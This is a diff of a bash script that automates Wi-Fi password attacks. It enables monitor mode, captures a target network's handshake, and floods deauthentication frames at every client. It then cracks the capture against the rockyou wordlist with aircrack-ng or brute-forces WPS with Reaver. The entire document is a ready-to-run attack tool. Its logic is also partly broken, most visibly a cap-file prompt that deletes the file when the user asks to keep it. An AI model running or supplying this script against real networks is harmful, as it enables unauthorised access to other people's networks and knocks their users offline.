@@ -1,52 +1,57 @@
 #!/bin/bash
 clear
-echo "+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+"
-echo "|A|u|t|o|m|a|t|e|d| |A|i|r|c|r|a|c|k|"
-echo "+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+"
-echo 
-airmon-ng start wlan1
-airmon-ng check kill
+echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
+echo "|A|i|r|c|r|a|c|k| |A|u|t|o|m|a|t|e|d|"
+echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
 echo
-echo "wlan 1 has been set to monitor mode and is now wlan1mon"
-ifconfig
-sleep 5
-echo "in 10 secconds we will find a target and input will be needed to find the target"
-sleep 10
-xterm -hold -e sudo "airodump-ng start wlan1mon"
-echo Enter bssid of target
+echo Enter Interface Name:
+read interface
+echo Enter Monitor mode interface name:
+read mon
+airmon-ng start $interface
+airmon-ng check kill
+echo Enter Monitor Mode Interface:
+read mon
+xterm -hold -e "airodump-ng $mon"
+echo Enter BSSID Of Target
 read bid
 echo $bid
-echo Enter channer of target
-read chn1
-echo $chn1
-xterm -hold -e sudo "airodump-ng --bssid $bid --channel $chnl --write $filn $mon"
-sleep 3
-xterm -hold -e sudo "airplay-ng --deauth 100 -a $bid wlan1mon"
-sleep 5
+echo Enter Channel Of Target
+read chnl
+client=FF:FF:FF:FF:FF:FF
+xterm -hold -e "airodump-ng --ig -w cap -c $chnl --bssid $bid $mon"
+xterm -hold -e "aireplay-ng --ig --deauth 100 -a $bid -c $client $mon"
+sleep 4
 clear
-sleep 2
-echo "1. Use Default Wordlist(rockyou.txt)."
-echo "2. Specify a Custom One."
+echo "Do you want to use a wordlist (y/n)"
 read option
-if [ $option == "1" ]; then
-   wordlist="/usr/share/wordlists/rockyou.txt"
+if [ $option == "n" ]; then
+   xterm -hold -e "Reaver -i wlan1mon -b $bid -vv"
 else
-   echo Enter Path Of Your Custom Wordlist.
-   read wordlist
+   echo "1. Use Default Wordlist(rockyou.txt)."
+   echo "2. Specify a Custom One."
+   read option2
+   if [ $option2 == "1" ]; then
+     wordlist="/usr/share/wordlists/rockyou.txt"
+     xterm -hold -e "aircrack-ng -w $wordlist ./cap-01.cap"
+   else
+     echo Enter Path Of Your Custom Wordlist.
+     read wordlist
+     xterm -hold -e "aircrack-ng -w $wordlist ./cap-01.cap"
+   fi 
 fi
-xterm -hold -e sudo "aircrack-ng -w $wordlist ./cap-01.cap"
 echo "1. Keep monitor mode on."
 echo "2. Turn off monitor mode."
-read d1
-if [ $d1 == "1" ]; then
+read d2
+if [ $d2 == "1" ]; then
    sleep 1
 else
    echo "Removing monitor mode"
    airmon-ng stop wlan1mon
 fi
 echo "Do you wish to keep the cap file (y/n)"
-read d2
-if [ $d2 == "y" ]; then
+read d3
+if [ $d3 == "y" ]; then
    rm cap*
 else
    echo "The cap file has been kept"
